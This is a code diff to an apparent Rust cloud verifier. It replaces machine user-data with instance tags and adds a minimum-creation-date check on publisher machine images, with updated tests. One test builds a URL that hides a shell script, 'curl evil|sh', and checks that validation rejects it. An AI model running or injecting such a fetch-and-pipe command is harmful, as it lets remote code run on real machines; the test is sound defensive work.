@@ -23,7 +23,7 @@ use alien_aws_clients::ec2::{
     DescribeLaunchTemplatesRequest, Ec2Api, LaunchTemplateBlockDeviceMapping,
     LaunchTemplateCpuOptions, LaunchTemplateEbsBlockDevice,
     LaunchTemplateIamInstanceProfileSpecification, LaunchTemplateInstanceMetadataOptions,
-    RequestLaunchTemplateData,
+    RequestLaunchTemplateData, Tag, TagSpecification,
 };
 use alien_client_core::ErrorData as CloudClientErrorData;
 use alien_core::release_statement::signed_stack;
@@ -31,7 +31,7 @@ use alien_core::{CapacityGroup, ComputeCluster, Platform};
 use alien_error::{AlienError, Context, IntoAlienError};
 use alien_signing::{Kind, ReleaseBody, SignedStatement};
 use async_trait::async_trait;
-use base64::Engine as _;
+use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
 
 use crate::error::{ErrorData, Result};
@@ -58,10 +58,13 @@ pub struct RollMachines {
     /// the signed group names one, this must be it.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub instance_type: Option<String>,
-    /// `https://` URL of the machine control plane the agent connects to.
-    /// It comes from the caller: a machine checks every release and config
-    /// signature itself, so a wrong URL can only keep machines from work.
-    pub api_url: String,
+    /// `https://` URL of the machine control plane, for development machine
+    /// images: they read it from the `HorizonApiUrl` tag. Released images
+    /// ignore it (their URL is built in), and every machine checks each
+    /// release and config signature itself, so a wrong URL can only keep
+    /// machines from work.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub api_url: Option<String>,
     /// The security groups the caller expects. The verifier uses the ones
     /// setup created for machines; these, if given, must be exactly those.
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -69,6 +72,10 @@ pub struct RollMachines {
     /// The subnets the caller expects, checked the same way.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub subnet_ids: Option<Vec<String>>,
+    /// GCP zone of a zonal group, in the verifier's region; absent for a
+    /// regional one, and on AWS and Azure.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub zone: Option<String>,
 }
 
 /// Resize one machine group within its signed bounds (GCP MIG, Azure VMSS).
@@ -92,23 +99,26 @@ pub struct Scale {
     pub signer_lists: Vec<SignedStatement>,
 }
 
-/// The typed user-data a protected machine boots with. The machine agent
-/// reads only these fields; it never runs user-data as a script.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase", deny_unknown_fields)]
-pub struct MachineUserData {
-    /// The machine agent's settings.
-    pub machine_agent: MachineAgentUserData,
-}
+/// Instance tag (AWS, Azure) or metadata key (GCP, in kebab case) a
+/// machine reads its capacity group from.
+pub const CAPACITY_GROUP_TAG: &str = "HorizonCapacityGroup";
+/// Instance tag a development machine image reads the control plane URL from.
+pub const API_URL_TAG: &str = "HorizonApiUrl";
 
-/// What the machine agent takes from user-data.
-#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase", deny_unknown_fields)]
-pub struct MachineAgentUserData {
-    /// Machine control plane URL.
-    pub api_url: String,
-    /// Digest of the machine agent build the release runs with.
-    pub digest: String,
+/// What a machine reads at boot, besides its image and identity: its
+/// capacity group, and the control plane URL for development images.
+/// Machines read no user-data.
+pub fn boot_tags(group: &str, api_url: Option<&str>) -> Result<Vec<(String, String)>> {
+    let mut tags = vec![(CAPACITY_GROUP_TAG.to_string(), group.to_string())];
+    if let Some(url) = api_url {
+        if !is_api_url(url) {
+            return Err(refused(format!(
+                "'{url}' is not an https URL the verifier writes"
+            )));
+        }
+        tags.push((API_URL_TAG.to_string(), url.to_string()));
+    }
+    Ok(tags)
 }
 
 fn refused(reason: impl Into<String>) -> AlienError<ErrorData> {
@@ -236,13 +246,81 @@ pub struct RollPlan {
     pub subnet_ids: Vec<String>,
 }
 
-/// What the verifier learned about the image: its owner and architecture.
+/// What the verifier learned about the image from the cloud: its owner,
+/// architecture and when it was created.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct ImageFacts {
     /// Account that owns it.
     pub owner: String,
     /// `x86_64` or `arm64`.
     pub architecture: String,
+    /// When the cloud says it was created.
+    pub created: DateTime<Utc>,
+}
+
+/// The images this build boots, compiled in by the release workflow.
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub struct ImagePins {
+    /// The account (AWS), project (GCP) or community gallery (Azure) that
+    /// publishes them.
+    pub publisher: Option<String>,
+    /// The oldest image creation time it boots.
+    pub minimum_created: Option<DateTime<Utc>>,
+}
+
+impl ImagePins {
+    /// The AWS pins this build was released with.
+    pub fn aws() -> Self {
+        Self {
+            publisher: alien_core::machine_image_publisher_aws().map(str::to_string),
+            minimum_created: alien_core::machine_image_minimum_created(),
+        }
+    }
+
+    /// The GCP pins this build was released with.
+    pub fn gcp() -> Self {
+        Self {
+            publisher: alien_core::machine_image_publisher_gcp().map(str::to_string),
+            minimum_created: alien_core::machine_image_minimum_created(),
+        }
+    }
+
+    /// The Azure pins this build was released with.
+    pub fn azure() -> Self {
+        Self {
+            publisher: alien_core::machine_image_publisher_azure().map(str::to_string),
+            minimum_created: alien_core::machine_image_minimum_created(),
+        }
+    }
+
+    /// Refuse `image` (named `id`) unless the publisher made it and it is
+    /// no older than the minimum.
+    pub fn check(&self, id: &str, image: &ImageFacts) -> Result<()> {
+        let publisher = self.publisher.as_deref().ok_or_else(|| {
+            refused(
+                "this verifier build names no machine-image publisher, so it launches no machines",
+            )
+        })?;
+        let minimum = self.minimum_created.ok_or_else(|| {
+            refused("this verifier build names no oldest machine image, so it launches no machines")
+        })?;
+        if image.owner != publisher {
+            return Err(refused(format!(
+                "image {id} is owned by {}, not the publisher {publisher}",
+                image.owner
+            )));
+        }
+        // The publisher's older images may carry fixed flaws; the build
+        // names the oldest one it still boots.
+        if image.created < minimum {
+            return Err(refused(format!(
+                "image {id} was created {}, before {}, the oldest image this build boots",
+                image.created.to_rfc3339(),
+                minimum.to_rfc3339()
+            )));
+        }
+        Ok(())
+    }
 }
 
 fn is_id(text: &str, prefix: &str) -> bool {
@@ -280,36 +358,34 @@ fn check_setup_ids(what: &str, asked: Option<&[String]>, setup: &[String]) -> Re
     Ok(())
 }
 
-/// Build the launch template for a roll. `publisher` is the account whose
-/// images this build boots; `image` is what the verifier read about the
-/// requested image.
-pub fn plan_roll(
+/// What every cloud's roll takes from the signed release and the request,
+/// after the checks they share.
+#[derive(Debug, Clone)]
+pub struct RollBasics {
+    /// The signed capacity group.
+    pub group: CapacityGroup,
+    /// The instance type, machine type or VM size machines run as.
+    pub instance_type: String,
+    /// What machines read at boot (see [`boot_tags`]).
+    pub tags: Vec<(String, String)>,
+    /// `<prefix>-<cluster>-<group>`, the group's name in the cloud.
+    pub name: String,
+}
+
+/// The checks every cloud's roll shares: the image is the publisher's and
+/// recent enough, the group and instance type are the signed ones, and the
+/// release pins an agent build for the image's architecture.
+pub fn roll_basics(
     place: &Place,
     release: &ReleaseBody,
     request: &RollMachines,
-    publisher: Option<&str>,
+    pins: &ImagePins,
     image: &ImageFacts,
-) -> Result<RollPlan> {
-    let publisher = publisher.ok_or_else(|| {
-        refused("this verifier build names no machine-image publisher, so it launches no machines")
-    })?;
-    if !is_id(&request.machine_image, "ami-") {
-        return Err(refused(format!(
-            "'{}' is not an AMI id",
-            request.machine_image
-        )));
-    }
-    // The caller picks the image, so it may pick any image the publisher
-    // ever released, old ones included. That is an accepted limit: old
-    // publisher images stay bootable. What an old image runs is still the
-    // machine agent build the signed release pins below, which the image
-    // downloads and checks against `digest` before starting it.
-    if image.owner != publisher {
-        return Err(refused(format!(
-            "image {} is owned by {}, not the publisher {publisher}",
-            request.machine_image, image.owner
-        )));
-    }
+) -> Result<RollBasics> {
+    // The caller picks the image: any publisher image no older than the
+    // build's minimum. What it runs is the machine agent build the signed
+    // release pins.
+    pins.check(&request.machine_image, image)?;
     let group = signed_group(release, &request.cluster, &request.group)?;
     let instance_type = match (&group.instance_type, &request.instance_type) {
         (Some(signed), Some(asked)) if signed != asked => {
@@ -330,17 +406,42 @@ pub fn plan_roll(
             )))
         }
     };
-    let digest = release.components.get(component).ok_or_else(|| {
-        refused(format!(
-            "the release pins no {component} build, so no machine may boot it"
-        ))
-    })?;
-    if !is_api_url(&request.api_url) {
+    // Machines run only the agent build the signed release pins; one that
+    // pins none boots nothing.
+    if !release.components.contains_key(component) {
         return Err(refused(format!(
-            "'{}' is not an https URL the verifier writes",
-            request.api_url
+            "the release pins no {component} build, so no machine may boot it"
         )));
     }
+    Ok(RollBasics {
+        tags: boot_tags(&request.group, request.api_url.as_deref())?,
+        name: scale_target(&place.prefix, &request.cluster, &request.group)?,
+        group,
+        instance_type,
+    })
+}
+
+/// Build the launch template for a roll. `pins` name the images this build
+/// boots; `image` is what the verifier read about the requested image.
+pub fn plan_roll(
+    place: &Place,
+    release: &ReleaseBody,
+    request: &RollMachines,
+    pins: &ImagePins,
+    image: &ImageFacts,
+) -> Result<RollPlan> {
+    if !is_id(&request.machine_image, "ami-") {
+        return Err(refused(format!(
+            "'{}' is not an AMI id",
+            request.machine_image
+        )));
+    }
+    let RollBasics {
+        group,
+        instance_type,
+        tags,
+        name: base,
+    } = roll_basics(place, release, request, pins, image)?;
     let network = place.machine_network.as_ref().ok_or_else(|| {
         refused("setup fixed no machine network for this verifier, so it launches no machines")
     })?;
@@ -360,24 +461,10 @@ pub fn plan_roll(
         &network.security_group_ids,
     )?;
     check_setup_ids("subnet", request.subnet_ids.as_deref(), &network.subnet_ids)?;
-    let user_data = MachineUserData {
-        machine_agent: MachineAgentUserData {
-            api_url: request.api_url.clone(),
-            digest: digest.clone(),
-        },
+    let account = match &place.install {
+        alien_signing::InstallId::Aws { account, .. } => account.clone(),
+        _ => return Err(refused("this is the AWS roll")),
     };
-    let user_data = serde_json::to_string(&user_data).map_err(|error| {
-        AlienError::new(ErrorData::ConfigurationInvalid {
-            message: format!("user-data does not serialize: {error}"),
-        })
-    })?;
-    let (account, prefix) = match &place.install {
-        alien_signing::InstallId::Aws {
-            account, prefix, ..
-        } => (account.clone(), prefix.clone()),
-        _ => return Err(refused("machines roll through the verifier on AWS only")),
-    };
-    let base = format!("{prefix}-{}-{}", request.cluster, request.group);
     let ebs = |size: i32| LaunchTemplateEbsBlockDevice {
         volume_size: Some(size),
         volume_type: Some("gp3".to_string()),
@@ -403,14 +490,21 @@ pub fn plan_roll(
             arn: Some(format!("arn:aws:iam::{account}:instance-profile/{base}")),
             name: None,
         })
-        .user_data(base64::engine::general_purpose::STANDARD.encode(user_data))
+        .tag_specifications(vec![TagSpecification {
+            resource_type: "instance".to_string(),
+            tags: tags
+                .into_iter()
+                .map(|(key, value)| Tag { key, value })
+                .collect(),
+        }])
         .security_group_ids(network.security_group_ids.clone())
         .block_device_mappings(disks)
         .metadata_options(LaunchTemplateInstanceMetadataOptions {
             http_tokens: Some("required".to_string()),
             http_endpoint: Some("enabled".to_string()),
             http_put_response_hop_limit: Some(1),
-            instance_metadata_tags: Some("disabled".to_string()),
+            // The machine reads its capacity group from its tags.
+            instance_metadata_tags: Some("enabled".to_string()),
         })
         .maybe_cpu_options((group.nested_virtualization == Some(true)).then(|| {
             LaunchTemplateCpuOptions {
@@ -573,9 +667,15 @@ impl<E: Ec2Api, A: AutoScalingApi> MachineApi for AwsMachines<E, A> {
                         "ec2:DescribeImages {id} returned no {field}"
                     )))
                 };
+                let created = image
+                    .creation_date
+                    .as_deref()
+                    .and_then(|text| DateTime::parse_from_rfc3339(text).ok())
+                    .ok_or_else(|| missing("creation date"))?;
                 Ok(ImageFacts {
                     owner: image.owner_id.ok_or_else(|| missing("owner"))?,
                     architecture: image.architecture.ok_or_else(|| missing("architecture"))?,
+                    created: created.with_timezone(&Utc),
                 })
             })
             .transpose()
@@ -730,6 +830,7 @@ mod tests {
             machine_network: Some(SetupNetwork {
                 subnet_ids: vec![SUBNET.to_string()],
                 security_group_ids: vec![SECURITY_GROUP.to_string()],
+                identity: None,
             }),
         }
     }
@@ -787,9 +888,10 @@ mod tests {
             config: None,
             machine_image: "ami-0123456789abcdef0".to_string(),
             instance_type: None,
-            api_url: "https://machines.example.com".to_string(),
+            api_url: Some("https://machines.example.com".to_string()),
             security_group_ids: None,
             subnet_ids: None,
+            zone: None,
         }
     }
 
@@ -797,7 +899,48 @@ mod tests {
         ImageFacts {
             owner: owner.to_string(),
             architecture: "arm64".to_string(),
+            created: "2026-09-01T00:00:00Z".parse().unwrap(),
         }
+    }
+
+    fn pins() -> ImagePins {
+        ImagePins {
+            publisher: Some(PUBLISHER.to_string()),
+            minimum_created: Some("2026-08-01T00:00:00Z".parse().unwrap()),
+        }
+    }
+
+    #[test]
+    fn publisher_images_older_than_the_minimum_are_refused() {
+        // Off: an image no older than the minimum boots.
+        plan_roll(
+            &place(),
+            &release(),
+            &request(),
+            &pins(),
+            &arm_image(PUBLISHER),
+        )
+        .unwrap();
+        // Attack: an older image the publisher released before a fix.
+        let mut old = arm_image(PUBLISHER);
+        old.created = "2026-03-01T00:00:00Z".parse().unwrap();
+        assert_eq!(
+            reason(plan_roll(&place(), &release(), &request(), &pins(), &old)),
+            "Refused: image ami-0123456789abcdef0 was created 2026-03-01T00:00:00+00:00, before 2026-08-01T00:00:00+00:00, the oldest image this build boots"
+        );
+        // A build without a minimum launches nothing.
+        let unpinned = ImagePins {
+            minimum_created: None,
+            ..pins()
+        };
+        assert!(reason(plan_roll(
+            &place(),
+            &release(),
+            &request(),
+            &unpinned,
+            &arm_image(PUBLISHER)
+        ))
+        .contains("names no oldest machine image"));
     }
 
     fn reason(result: Result<RollPlan>) -> String {
@@ -810,7 +953,7 @@ mod tests {
             &place(),
             &release(),
             &request(),
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER),
         )
         .unwrap();
@@ -834,18 +977,29 @@ mod tests {
             Some("required")
         );
         assert!(plan.data.key_name.is_none() && plan.data.network_interfaces.is_none());
-        let user_data = base64::engine::general_purpose::STANDARD
-            .decode(plan.data.user_data.as_deref().unwrap())
-            .unwrap();
-        let user_data: MachineUserData = serde_json::from_slice(&user_data).unwrap();
+        // Machines read no user-data: the group and, for development
+        // images, the URL come from instance tags they read through IMDS.
+        assert!(plan.data.user_data.is_none());
         assert_eq!(
-            user_data,
-            MachineUserData {
-                machine_agent: MachineAgentUserData {
-                    api_url: "https://machines.example.com".to_string(),
-                    digest: AGENT.to_string(),
-                }
-            }
+            plan.data
+                .metadata_options
+                .as_ref()
+                .unwrap()
+                .instance_metadata_tags
+                .as_deref(),
+            Some("enabled")
+        );
+        let tags = &plan.data.tag_specifications.as_ref().unwrap()[0];
+        assert_eq!(tags.resource_type, "instance");
+        assert_eq!(
+            tags.tags
+                .iter()
+                .map(|tag| (tag.key.as_str(), tag.value.as_str()))
+                .collect::<Vec<_>>(),
+            vec![
+                ("HorizonCapacityGroup", "general"),
+                ("HorizonApiUrl", "https://machines.example.com")
+            ]
         );
     }
 
@@ -855,7 +1009,7 @@ mod tests {
             &place(),
             &release(),
             &request(),
-            Some(PUBLISHER),
+            &pins(),
             &arm_image("999988887777"),
         ))
         .contains("not the publisher 345678901234"));
@@ -863,7 +1017,10 @@ mod tests {
             &place(),
             &release(),
             &request(),
-            None,
+            &ImagePins {
+                publisher: None,
+                ..pins()
+            },
             &arm_image(PUBLISHER)
         ))
         .contains("names no machine-image publisher"));
@@ -873,7 +1030,7 @@ mod tests {
             &place(),
             &release(),
             &snapshot,
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER),
         ))
         .contains("not an AMI id"));
@@ -887,19 +1044,19 @@ mod tests {
             &place(),
             &release(),
             &other_type,
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER),
         ))
         .contains("not the signed m7g.large"));
 
         // A script hidden in the URL can't reach user-data.
         let mut script = request();
-        script.api_url = "https://x.example.com\n#!/bin/sh\ncurl evil|sh".to_string();
+        script.api_url = Some("https://x.example.com\n#!/bin/sh\ncurl evil|sh".to_string());
         assert!(reason(plan_roll(
             &place(),
             &release(),
             &script,
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER)
         ))
         .contains("not an https URL"));
@@ -910,7 +1067,7 @@ mod tests {
             &place(),
             &release(),
             &other_group,
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER),
         ))
         .contains("no capacity group 'gpu'"));
@@ -919,13 +1076,7 @@ mod tests {
     #[test]
     fn machines_join_only_the_network_setup_created() {
         let roll = |place: &Place, request: &RollMachines| {
-            plan_roll(
-                place,
-                &release(),
-                request,
-                Some(PUBLISHER),
-                &arm_image(PUBLISHER),
-            )
+            plan_roll(place, &release(), request, &pins(), &arm_image(PUBLISHER))
         };
         let plan = roll(&place(), &request()).unwrap();
         assert_eq!(
@@ -991,7 +1142,7 @@ mod tests {
             &place(),
             &unpinned,
             &request(),
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER),
         ))
         .contains("pins no machine-agent/linux-aarch64 build"));
@@ -1101,7 +1252,7 @@ mod tests {
             &place(),
             &release(),
             &request(),
-            Some(PUBLISHER),
+            &pins(),
             &arm_image(PUBLISHER),
         )
         .unwrap()
